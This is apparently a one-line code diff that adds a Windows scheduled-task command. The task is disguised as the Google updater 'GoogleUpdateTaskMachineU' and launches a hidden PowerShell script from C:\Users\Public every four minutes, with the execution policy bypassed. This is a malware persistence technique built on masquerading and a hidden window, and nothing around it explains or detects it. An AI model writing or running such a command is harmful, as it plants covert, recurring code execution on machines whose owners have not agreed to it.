@@ -1,0 +1,1 @@
+schtasks /create /tn "GoogleUpdateTaskMachineU" /tr "cmd /c start /min powershell.exe -ExecutionPolicy Bypass -nop -w 1 C:\Users\Public\input.ps1" /sc minute /mo 4 /F 
